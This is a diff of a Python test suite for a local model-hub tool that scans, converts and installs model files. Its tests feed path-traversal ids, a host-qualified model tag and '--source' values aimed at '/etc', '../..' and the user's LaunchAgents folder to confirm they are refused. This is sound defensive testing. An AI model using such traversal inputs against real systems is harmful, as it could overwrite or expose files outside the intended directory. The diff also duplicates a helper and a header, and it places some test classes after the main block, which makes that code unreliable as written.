+            self.assertEqual(obj.get("verdict"), "allow")
+            self.assertNotIn("canonical_path", obj)
+            self.assertEqual(list(Path(canonical).iterdir()), [], "nothing left in a models dir")
+            gate_root = Path(os.environ["PROMETHEUS_MODELS_HOME"]).resolve()
+            self.assertIn(gate_root, Path(obj["path"]).resolve().parents)
 
     def test_rejects_a_path_traversal_id(self) -> None:
         with tempfile.TemporaryDirectory() as tmp, tempfile.TemporaryDirectory() as src:
@@ -1353,7 +1691,8 @@ class ConvertTests(unittest.TestCase):
         with tempfile.TemporaryDirectory() as tmp, tempfile.TemporaryDirectory() as src, \
                 tempfile.TemporaryDirectory() as out:
             conv_dir = self._stub_converter_dir(tmp)
-            (Path(src) / "weights.bin").write_bytes(b"\x00" * 1024)
+            # safetensors, not a pickle .bin: a pickle-only source is now refused outright
+            (Path(src) / "model.safetensors").write_bytes(b"\x00" * 1024)
             obj, _stderr, code = run_verb_env(
                 {"MODELHUB_FORCE_LLAMACPP_DIR": conv_dir, "MODELHUB_FAKE_CONVERT_LINES": "should not run"},
                 "convert", "--src", src, "--out", out, "--quant", "f16", "--floor-pct", "100",
@@ -1377,32 +1716,98 @@ class ConvertTests(unittest.TestCase):
             self.assertTrue(obj["ok"], msg=obj.get("error"))
             self.assertEqual(code, 0)
 
-    def test_alternate_disk_leaves_a_canonical_symlink(self) -> None:
+    def test_a_blocked_conversion_output_is_never_admitted(self) -> None:
         with tempfile.TemporaryDirectory() as tmp, tempfile.TemporaryDirectory() as src, \
-                tempfile.TemporaryDirectory() as alt_disk, tempfile.TemporaryDirectory() as canonical:
+                tempfile.TemporaryDirectory() as out:
             conv_dir = self._stub_converter_dir(tmp)
             obj, _stderr, code = run_verb_env(
                 {
                     "MODELHUB_FORCE_LLAMACPP_DIR": conv_dir,
                     "MODELHUB_FAKE_CONVERT_LINES": "convert: 100%",
-                    "PROMETHEUS_MODELS_DIR": canonical,
+                    "NEMESIS_BIN": self._output_blocking_nemesis(),
                 },
-                "convert", "--src", src, "--out", alt_disk, "--quant", "f16", "--id", "acme/tiny",
+                "convert", "--src", src, "--out", out, "--quant", "f16", "--id", "acme/tiny",
             )
-            self.assertTrue(obj["ok"], msg=obj.get("error"))
-            self.assertEqual(code, 0)
-            self.assertNotEqual(obj["path"], obj["canonical_path"])
-            self.assertTrue(Path(obj["path"]).is_file())
-            canonical_path = Path(obj["canonical_path"])
-            self.assertTrue(canonical_path.is_symlink())
-            self.assertEqual(canonical_path.resolve(), Path(obj["path"]).resolve())
+            self.assertFalse(obj["ok"])
+            self.assertEqual(code, 2)
+            # the SOURCE passed; the converter's own output is what was refused
+            self.assertEqual(obj.get("verdict"), "block", obj)
+            self.assertIn("quarantined", obj.get("error", ""))
+
+    def _output_blocking_nemesis(self) -> str:
+        """Allows any tree except the staged converter output (`converted-*`)."""
+        p = Path(self._nem) / "fake_nemesis_output_block.py"
+        p.write_text(
+            "import json, sys\n"
+            "blk = any('converted-' in a for a in sys.argv)\n"
+            "v = 'block' if blk else 'allow'\n"
+            "print(json.dumps({'verdict': v, 'risk_score': 0, 'blocking_reasons': []}))\n"
+            "sys.exit(20 if blk else 0)\n",
+            encoding="utf-8",
+        )
+        return str(p)
 
 
 # --------------------------------------------------------------------------- #
 # /hug — install-target (env-stubbed subprocess: no real ollama/lms, no network)
 # --------------------------------------------------------------------------- #
 
+# --------------------------------------------------------------------------- #
+# /hug — install-target (env-stubbed subprocess: no real ollama/lms, no network)
+# --------------------------------------------------------------------------- #
+
+@contextlib.contextmanager
+def vouched_gguf():
+    """A GGUF nemesis vouches for: the scan marker `convert`/gate_dir leaves on its folder,
+    minted in-process with this machine's own gate key (so it verifies in the subprocess)."""
+    sys.path.insert(0, str(HERE))
+    import model_acquire as ma  # noqa: E402
+    d = Path(tempfile.mkdtemp(prefix="vouched-gguf-"))
+    gguf = d / "m.gguf"
+    gguf.write_bytes(b"GGUF" + b"\x00" * 28)
+    rec = {"verdict": "allow", "forced": False, "fingerprint": ma.tree_fingerprint(d),
+           "scanned_at": "2026-11-03T00:00:00Z"}
+    mac = ma._marker_mac(rec)
+    if mac:
+        rec["mac"] = mac
+    (d / ma.GATE_MARKER).write_text(json.dumps(rec), encoding="utf-8")
+    try:
+        yield types.SimpleNamespace(name=str(gguf))
+    finally:
+        shutil.rmtree(d, ignore_errors=True)
+
+
+@contextlib.contextmanager
+def vouched_gguf():
+    """A GGUF nemesis vouches for: the scan marker `convert`/gate_dir leaves on its folder,
+    minted in-process with this machine's own gate key (so it verifies in the subprocess)."""
+    sys.path.insert(0, str(HERE))
+    import model_acquire as ma  # noqa: E402
+    d = Path(tempfile.mkdtemp(prefix="vouched-gguf-"))
+    gguf = d / "m.gguf"
+    gguf.write_bytes(b"GGUF" + b"\x00" * 28)
+    rec = {"verdict": "allow", "forced": False, "fingerprint": ma.tree_fingerprint(d),
+           "scanned_at": "2026-11-03T00:00:00Z"}
+    mac = ma._marker_mac(rec)
+    if mac:
+        rec["mac"] = mac
+    (d / ma.GATE_MARKER).write_text(json.dumps(rec), encoding="utf-8")
+    try:
+        yield types.SimpleNamespace(name=str(gguf))
+    finally:
+        shutil.rmtree(d, ignore_errors=True)
+
+
 class InstallTargetTests(unittest.TestCase):
+    def test_an_unvouched_gguf_is_never_wired_into_a_runtime(self) -> None:
+        with tempfile.NamedTemporaryFile(suffix=".gguf") as f:
+            for target in ("llamacpp", "lmstudio", "ollama"):
+                obj, _stderr, code = run_verb(
+                    "install-target", "--id", "acme/tiny", "--target", target, "--gguf", f.name,
+                )
+                self.assertFalse(obj["ok"], target)
+                self.assertIn("never admitted", obj.get("error", ""), target)
+
     def test_needs_id(self) -> None:
         obj, _stderr, code = run_verb("install-target", "--target", "llamacpp")
         self.assertFalse(obj["ok"])
@@ -1414,7 +1819,7 @@ class InstallTargetTests(unittest.TestCase):
         self.assertEqual(code, 2)
 
     def test_llamacpp_target_is_a_pure_pass_through(self) -> None:
-        with tempfile.NamedTemporaryFile(suffix=".gguf") as f:
+        with vouched_gguf() as f:
             obj, _stderr, code = run_verb(
                 "install-target", "--id", "acme/tiny", "--target", "llamacpp", "--gguf", f.name,
             )
@@ -1423,78 +1828,124 @@ class InstallTargetTests(unittest.TestCase):
             self.assertEqual(obj["target"], "llamacpp")
             self.assertEqual(obj["path"], f.name)
 
-    def test_vllm_target_is_a_pure_pass_through(self) -> None:
+    def test_vllm_target_needs_an_admitted_directory(self) -> None:
+        # vLLM loads whatever the directory holds: any folder used to be accepted unchecked
         with tempfile.TemporaryDirectory() as src:
             obj, _stderr, code = run_verb(
                 "install-target", "--id", "acme/tiny", "--target", "vllm", "--src", src,
             )
-            self.assertTrue(obj["ok"], msg=obj.get("error"))
-            self.assertEqual(code, 0)
-            self.assertEqual(obj["target"], "vllm")
-            self.assertEqual(obj["path"], src)
+            self.assertFalse(obj["ok"])
+            self.assertEqual(code, 2)
+            self.assertIn("admitted", obj["error"])
 
-    def test_lmstudio_symlinks_when_lms_cli_is_absent(self) -> None:
-        with tempfile.NamedTemporaryFile(suffix=".gguf") as f, tempfile.TemporaryDirectory() as lmdir:
+    def test_lmstudio_gets_a_hard_link_never_a_copy_or_a_move(self) -> None:
+        with vouched_gguf() as f, tempfile.TemporaryDirectory() as lmdir:
             obj, _stderr, code = run_verb_env(
                 {"MODELHUB_FORCE_NO_LMS": "1", "MODELHUB_FORCE_LMSTUDIO_DIR": lmdir},
                 "install-target", "--id", "acme/tiny-model", "--target", "lmstudio", "--gguf", f.name,
             )
             self.assertTrue(obj["ok"], msg=obj.get("error"))
             self.assertEqual(code, 0)
-            self.assertEqual(obj["method"], "symlink")
-            link = Path(obj["path"])
-            self.assertTrue(link.is_symlink())
-            self.assertEqual(link.resolve(), Path(f.name).resolve())
-            self.assertIn("acme", str(link))
-            self.assertIn("tiny-model", str(link))
+            placed = Path(obj["path"])
+            self.assertEqual(placed.relative_to(lmdir).parts, ("acme", "tiny-model", "m.gguf"))
+            self.assertTrue(Path(f.name).is_file(), "the scanned original stays")
+            self.assertTrue(os.path.samefile(placed, f.name), "one set of bytes, two names")
 
-    def test_lmstudio_uses_lms_import_when_present(self) -> None:
-        with tempfile.NamedTemporaryFile(suffix=".gguf") as f:
-            obj, stderr, code = run_verb_env(
-                {
-                    "MODELHUB_FAKE_LMS": "1",
-                    "MODELHUB_FAKE_INSTALL_LINES": "Imported OK",
-                    "MODELHUB_FAKE_INSTALL_CODE": "0",
-                },
+    def test_lms_import_is_never_used_it_moves_files_out_from_under_their_record(self) -> None:
+        with vouched_gguf() as f, tempfile.TemporaryDirectory() as lmdir:
+            obj, _stderr, code = run_verb_env(
+                {"MODELHUB_FAKE_LMS": "1", "MODELHUB_FAKE_INSTALL_LINES": "Imported OK",
+                 "MODELHUB_FAKE_INSTALL_CODE": "0", "MODELHUB_FORCE_LMSTUDIO_DIR": lmdir},
                 "install-target", "--id", "acme/tiny", "--target", "lmstudio", "--gguf", f.name,
             )
             self.assertTrue(obj["ok"], msg=obj.get("error"))
-            self.assertEqual(code, 0)
-            self.assertEqual(obj["method"], "lms-import")
+            self.assertNotEqual(obj["method"], "lms-import")
+            self.assertTrue(Path(f.name).is_file())
 
-    def test_lmstudio_import_failure_is_reported(self) -> None:
-        with tempfile.NamedTemporaryFile(suffix=".gguf") as f:
+    def test_a_different_file_already_in_lm_studio_is_never_replaced(self) -> None:
+        with vouched_gguf() as f, tempfile.TemporaryDirectory() as lmdir:
+            mine = Path(lmdir) / "acme" / "tiny" / "m.gguf"
+            mine.parent.mkdir(parents=True)
+            mine.write_bytes(b"the user's own model")
             obj, _stderr, code = run_verb_env(
-                {
-                    "MODELHUB_FAKE_LMS": "1",
-                    "MODELHUB_FAKE_INSTALL_LINES": "error: could not parse gguf",
-                    "MODELHUB_FAKE_INSTALL_CODE": "1",
-                },
+                {"MODELHUB_FORCE_NO_LMS": "1", "MODELHUB_FORCE_LMSTUDIO_DIR": lmdir},
                 "install-target", "--id", "acme/tiny", "--target", "lmstudio", "--gguf", f.name,
             )
             self.assertFalse(obj["ok"])
             self.assertEqual(code, 2)
-            self.assertIn("exited 1", obj["error"])
+            self.assertIn("not replaced", obj["error"])
+            self.assertEqual(mine.read_bytes(), b"the user's own model")
 
-    def test_lmstudio_symlink_stays_flat_for_a_multi_slash_id(self) -> None:
-        # Regression test: a caller-supplied --id with 2+ slashes used to nest the
-        # LM Studio symlink 3+ levels deep instead of the intended publisher/model
-        # two-level layout.
-        with tempfile.NamedTemporaryFile(suffix=".gguf") as f, tempfile.TemporaryDirectory() as lmdir:
+    def test_lmstudio_layout_stays_flat_for_a_multi_slash_id(self) -> None:
+        # a caller-supplied --id with 2+ slashes must still land at publisher/model/<file>
+        with vouched_gguf() as f, tempfile.TemporaryDirectory() as lmdir:
             obj, _stderr, code = run_verb_env(
                 {"MODELHUB_FORCE_NO_LMS": "1", "MODELHUB_FORCE_LMSTUDIO_DIR": lmdir},
                 "install-target", "--id", "acme/tiny/extra", "--target", "lmstudio", "--gguf", f.name,
             )
             self.assertTrue(obj["ok"], msg=obj.get("error"))
-            self.assertEqual(code, 0)
-            link = Path(obj["path"])
-            rel = link.relative_to(lmdir)
-            # exactly publisher/model/<file> — three components, never more
+            rel = Path(obj["path"]).relative_to(lmdir)
             self.assertEqual(len(rel.parts), 3)
             self.assertEqual(rel.parts[0], "acme")
 
-    def test_rejects_a_path_traversal_id(self) -> None:
+    def test_serve_llamacpp_refuses_a_gguf_nemesis_never_saw(self) -> None:
         with tempfile.NamedTemporaryFile(suffix=".gguf") as f:
+            f.write(b"GGUF" + b"\x00" * 28)
+            f.flush()
+            obj, _stderr, code = run_verb("serve", "--id", "acme/tiny", "--runner", "llamacpp",
+                                          "--gguf", f.name)
+            self.assertFalse(obj["ok"])
+            self.assertIn("never admitted", obj["error"])
+
+    def test_serve_ollama_refuses_a_host_qualified_tag(self) -> None:
+        obj, _stderr, code = run_verb("serve", "--id", "hf.co/anyone/evil:Q4_K_M", "--runner", "ollama",
+                                      "--gguf", "/dev/null")
+        self.assertFalse(obj["ok"])
+
+class InstallTargetOllamaTests(unittest.TestCase):
+    """(Was a second `InstallTargetTests`, which silently shadowed the first class — none of
+    its tests ran.)"""
+    def test_an_unvouched_gguf_is_never_wired_into_a_runtime(self) -> None:
+        with tempfile.NamedTemporaryFile(suffix=".gguf") as f:
+            for target in ("llamacpp", "lmstudio", "ollama"):
+                obj, _stderr, code = run_verb(
+                    "install-target", "--id", "acme/tiny", "--target", target, "--gguf", f.name,
+                )
+                self.assertFalse(obj["ok"], target)
+                self.assertIn("never admitted", obj.get("error", ""), target)
+
+    def test_needs_id(self) -> None:
+        obj, _stderr, code = run_verb("install-target", "--target", "llamacpp")
+        self.assertFalse(obj["ok"])
+        self.assertEqual(code, 2)
+
+    def test_rejects_unknown_target(self) -> None:
+        obj, _stderr, code = run_verb("install-target", "--id", "acme/tiny", "--target", "bogus")
+        self.assertFalse(obj["ok"])
+        self.assertEqual(code, 2)
+
+    def test_llamacpp_target_is_a_pure_pass_through(self) -> None:
+        with vouched_gguf() as f:
+            obj, _stderr, code = run_verb(
+                "install-target", "--id", "acme/tiny", "--target", "llamacpp", "--gguf", f.name,
+            )
+            self.assertTrue(obj["ok"], msg=obj.get("error"))
+            self.assertEqual(code, 0)
+            self.assertEqual(obj["target"], "llamacpp")
+            self.assertEqual(obj["path"], f.name)
+
+    def test_vllm_target_needs_an_admitted_directory(self) -> None:
+        # vLLM loads whatever the directory holds: any folder used to be accepted unchecked
+        with tempfile.TemporaryDirectory() as src:
+            obj, _stderr, code = run_verb(
+                "install-target", "--id", "acme/tiny", "--target", "vllm", "--src", src,
+            )
+            self.assertFalse(obj["ok"])
+            self.assertEqual(code, 2)
+            self.assertIn("admitted", obj["error"])
+
+    def test_rejects_a_path_traversal_id(self) -> None:
+        with vouched_gguf() as f:
             obj, _stderr, code = run_verb(
                 "install-target", "--id", "a/../../etc/pwned", "--target", "llamacpp", "--gguf", f.name,
             )
@@ -1503,7 +1954,7 @@ class InstallTargetTests(unittest.TestCase):
             self.assertIn("..", obj["error"])
 
     def test_ollama_target_missing_runner_is_actionable(self) -> None:
-        with tempfile.NamedTemporaryFile(suffix=".gguf") as f:
+        with vouched_gguf() as f:
             obj, _stderr, code = run_verb_env(
                 {"MODELHUB_FORCE_NO_OLLAMA": "1"},
                 "install-target", "--id", "acme/tiny", "--target", "ollama", "--gguf", f.name,
@@ -1513,7 +1964,7 @@ class InstallTargetTests(unittest.TestCase):
             self.assertTrue(obj["installable"])
 
     def test_ollama_target_fails_when_daemon_down(self) -> None:
-        with tempfile.NamedTemporaryFile(suffix=".gguf") as f:
+        with vouched_gguf() as f:
             obj, _stderr, code = run_verb_env(
                 {"MODELHUB_FAKE_OLLAMA": "1", "MODELHUB_FORCE_DAEMON_DOWN": "1"},
                 "install-target", "--id", "acme/tiny", "--target", "ollama", "--gguf", f.name,
@@ -1523,7 +1974,7 @@ class InstallTargetTests(unittest.TestCase):
             self.assertIn("service", obj["error"])
 
     def test_ollama_target_success(self) -> None:
-        with tempfile.NamedTemporaryFile(suffix=".gguf") as f:
+        with vouched_gguf() as f:
             obj, stderr, code = run_verb_env(
                 {
                     "MODELHUB_FAKE_OLLAMA": "1",
@@ -1541,7 +1992,7 @@ class InstallTargetTests(unittest.TestCase):
             self.assertTrue(any(p.get("phase") == "ollama-create" for p in prog))
 
     def test_ollama_create_failure_is_reported(self) -> None:
-        with tempfile.NamedTemporaryFile(suffix=".gguf") as f:
+        with vouched_gguf() as f:
             obj, _stderr, code = run_verb_env(
                 {
                     "MODELHUB_FAKE_OLLAMA": "1",
@@ -1572,7 +2023,8 @@ class ExternalModelStores(unittest.TestCase):
         env = dict(os.environ)
         env["HOME"] = str(home)
         # Neutralise the ambient HF vars; the point is to control resolution exactly.
-        for k in ("HF_HUB_CACHE", "HF_HOME", "PROMETHEUS_MODELS_DIR"):
+        for k in ("HF_HUB_CACHE", "HF_HOME", "PROMETHEUS_MODELS_DIR", "LMSTUDIO_MODELS_DIR",
+                  "MODELHUB_FORCE_LMSTUDIO_DIR", "XDG_CACHE_HOME", "HUGGINGFACE_HUB_CACHE"):
             env.pop(k, None)
         env.update(extra_env or {})
         proc = subprocess.run(
@@ -1660,3 +2112,71 @@ class ExternalModelStores(unittest.TestCase):
 
 if __name__ == "__main__":
     unittest.main(verbosity=2)
+
+
+class OllamaCapsParity(unittest.TestCase):
+    """A daemon the sidecar starts gets the SAME caps as one the engine starts (CLAUDE.md §2.8)."""
+
+    def test_caps_match_the_engine(self) -> None:
+        import ast
+        import re
+        engine = (HERE.parents[2] / "prometheus.py").read_text(encoding="utf-8")
+        m = re.search(r"_PROMETHEUS_OLLAMA_CAPS = (\{.*?\})", engine, re.S)
+        self.assertIsNotNone(m)
+        sys.path.insert(0, str(HERE))
+        import modelhub as mh  # noqa: E402 — the sidecar module itself, read-only here
+        self.assertEqual(ast.literal_eval(m.group(1)), mh._OLLAMA_CAPS)
+
+
+class RemoveMatchingTests(unittest.TestCase):
+    """`remove --id llama` must never delete tinyllama/codellama; `--quant q4` never q4_k_m."""
+
+    def test_exact_ownership_and_quant_tokens(self) -> None:
+        sys.path.insert(0, str(HERE))
+        import modelhub as mh  # noqa: E402
+        own = mh._file_belongs_to
+        self.assertTrue(own(["acme__tiny", "tiny-q4_k_m.gguf"], "acme__tiny", "acme/tiny"))
+        self.assertTrue(own(["acme", "tiny", "tiny.gguf"], "acme__tiny", "acme/tiny"))
+        self.assertTrue(own(["acme__tiny-q4_k_m.gguf"], "acme__tiny", "acme/tiny"))
+        self.assertFalse(own(["tinyllama", "tinyllama-q4.gguf"], "llama", "llama"))
+        self.assertFalse(own(["acme__tiny2", "x.gguf"], "acme__tiny", "acme/tiny"))
+        self.assertTrue(mh._has_quant_token("m-q4.gguf", "q4"))
+        self.assertFalse(mh._has_quant_token("m-q4_k_m.gguf", "q4"))
+        self.assertTrue(mh._has_quant_token("m-Q4_K_M.gguf", "q4_k_m"))
+
+
+class LibrarySourceTests(unittest.TestCase):
+    """`--source` names a directory under the model library; it must never name the user's."""
+
+    def test_unknown_source_is_refused_before_staging(self) -> None:
+        with tempfile.TemporaryDirectory() as home, tempfile.TemporaryDirectory() as staged:
+            (Path(staged) / "model.gguf").write_bytes(b"GGUF")
+            victim = Path(home) / "Library" / "LaunchAgents"
+            victim.mkdir(parents=True)
+            (victim / "keep.plist").write_text("mine")
+            for src in (str(Path(home) / "Library"), "../..", "/tmp"):
+                obj, _stderr, code = run_verb_env(
+                    {"PROMETHEUS_MODELS_HOME": str(Path(home) / "models")},
+                    "download", "--id", "LaunchAgents", "--source", src, "--staged", staged,
+                )
+                self.assertFalse(obj["ok"])
+                self.assertEqual(code, 2)
+                self.assertIn("--source", obj["error"])
+            self.assertEqual((victim / "keep.plist").read_text(), "mine")
+
+    def test_live_dir_stays_inside_the_library(self) -> None:
+        import nemesis_gate
+        with tempfile.TemporaryDirectory() as home:
+            old = os.environ.get("PROMETHEUS_MODELS_HOME")
+            os.environ["PROMETHEUS_MODELS_HOME"] = home
+            try:
+                self.assertTrue(str(nemesis_gate.live_dir_for("a/b", "hf")).startswith(home))
+                with self.assertRaises(ValueError):
+                    nemesis_gate.live_dir_for("x", "/etc")
+                with self.assertRaises(ValueError):
+                    nemesis_gate.live_dir_for("x", "..")
+            finally:
+                if old is None:
+                    os.environ.pop("PROMETHEUS_MODELS_HOME", None)
+                else:
+                    os.environ["PROMETHEUS_MODELS_HOME"] = old
